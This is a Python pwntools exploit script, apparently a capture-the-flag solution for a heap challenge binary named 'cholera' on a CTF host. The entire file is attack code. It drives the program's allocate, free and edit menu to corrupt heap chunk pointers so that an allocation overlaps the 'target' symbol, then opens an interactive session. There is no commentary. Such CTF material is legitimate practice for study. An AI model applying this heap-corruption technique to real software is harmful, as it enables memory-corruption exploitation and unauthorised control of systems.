#!/usr/bin/env python2

import sys,os
from pwn import *

context.update(arch="amd64", endian="little", os="linux", )

LOCAL = True
HOST="pwn.game.alcapwnctf.in"
PORT=11337

TARGET=os.path.realpath("cholera")

e = ELF(TARGET, False)

ADDR = e.symbols['target']

def exploit(r):
    r.sendlineafter("Choice >> ",str(1))
    r.sendlineafter("Size >> ", str(48))

    r.sendlineafter("Choice >> ",str(1))
    r.sendlineafter("Size >> ", str(48))

    r.sendlineafter("Choice >> ",str(1))
    r.sendlineafter("Size >> ", str(64))

    r.sendlineafter("Choice >> ",str(1))
    r.sendlineafter("Size >> ", str(64))

    r.sendlineafter("Choice >> ",str(1))
    r.sendlineafter("Size >> ", str(80))

    r.sendlineafter("Choice >> ",str(1))
    r.sendlineafter("Size >> ", str(80))

    r.sendlineafter("Choice >> ",str(1))
    r.sendlineafter("Size >> ", str(0))

    r.sendlineafter("Choice >> ",str(1))
    r.sendlineafter("Size >> ", str(0))


    r.sendlineafter("Choice >> ",str(3))
    r.sendlineafter("Index >> ",str(0))

    r.sendlineafter("Choice >> ",str(3))
    r.sendlineafter("Index >> ",str(2))



    r.sendlineafter("Choice >> ",str(1))
    r.sendlineafter("Size >> ", str(0))



    r.sendlineafter("Choice >> ",str(3))
    r.sendlineafter("Index >> ", str(4))

    r.sendlineafter("Choice >> ",str(3))
    r.sendlineafter("Index >> ", str(6))


    r.sendlineafter("Choice >> ",str(2))
    r.sendlineafter("Index >> ",str(2))
    r.sendlineafter("Data >> ",p64(0)+p64(ADDR-16)+p64(0)+p64(ADDR-32))

    r.sendlineafter("Choice >> ",str(1))
    r.sendlineafter("Size >> ", str(0))

    r.sendlineafter("Choice >> ",str(4))

    r.interactive()
    return

if __name__ == "__main__":

    if len(sys.argv) > 1:
        LOCAL = False
        r = remote(HOST, PORT)
    else:
        LOCAL = True
        r = process([TARGET,])
        pause()

    exploit(r)

    sys.exit(0)